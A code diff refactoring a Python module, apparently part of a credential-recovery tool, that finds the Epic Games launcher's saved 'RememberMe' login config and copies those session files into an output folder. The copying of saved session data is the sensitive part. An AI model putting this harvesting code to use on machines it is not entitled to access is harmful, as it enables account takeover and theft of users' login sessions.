@@ -6,7 +6,7 @@ from config import ModuleManager, Constant
 
 class EpicGamesRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "EpicGamesRecovery")
+        super().__init__(module_name = "EpicGamesRecovery", module_path="applications/epicgames")
         
         self.banner(r"""
      _______         ______         _             _____                                 
@@ -20,35 +20,32 @@ class EpicGamesRecovery(ModuleManager):
                                    Recovery lost Epic Games accounts
                     """)
 
-        self.epic_folder = self.output_folder_user / 'applications' / 'epicgames'
-        self.epicPath = Constant.userprofile_dir / "EpicGamesLauncher" / "Saved" / "Config" / "Windows"
-
-        self.epic_folder.mkdir(parents=True, exist_ok=True)
+        self.epic_installation = Constant.userprofile_dir / "EpicGamesLauncher" / "Saved" / "Config" / "Windows"
 
     def run(self) -> None:
         recovered = False
-        if os.path.isdir(self.epicPath):
-            loginFile = os.path.join(self.epicPath, "GameUserSettings.ini") 
+        if os.path.isdir(self.epic_installation):
+            loginFile = os.path.join(self.epic_installation, "GameUserSettings.ini") 
             if os.path.isfile(loginFile):
                 self.mdebug(f"Checking {loginFile}")
                 with open(loginFile) as file:
                     contents = file.read()
                     if "[RememberMe]" in contents:
                         try:
-                            for file in os.listdir(self.epicPath):
-                                if os.path.isfile(os.path.join(self.epicPath, file)):
+                            for file in os.listdir(self.epic_installation):
+                                if os.path.isfile(os.path.join(self.epic_installation, file)):
                                     shutil.copy(
-                                        os.path.join(self.epicPath, file),
-                                        os.path.join(self.epic_folder, file),
+                                        os.path.join(self.epic_installation, file),
+                                        os.path.join(self.module_output, file),
                                     )
-                            shutil.copytree(self.epicPath, self.epic_folder, dirs_exist_ok=True)
+                            shutil.copytree(self.epic_installation, self.module_output, dirs_exist_ok=True)
                             recovered = True
                         except Exception:
                             pass
             else:
                 self.mdebug(f"Unable to find {loginFile}")
         else:
-            self.mdebug(f"Unable to find EpicGames Launcher installation at: {self.epicPath}")
+            self.mdebug(f"Unable to find EpicGames Launcher installation at: {self.epic_installation}")
         if recovered:
             self.mprint(f"Recovered Epic Games")
         else:
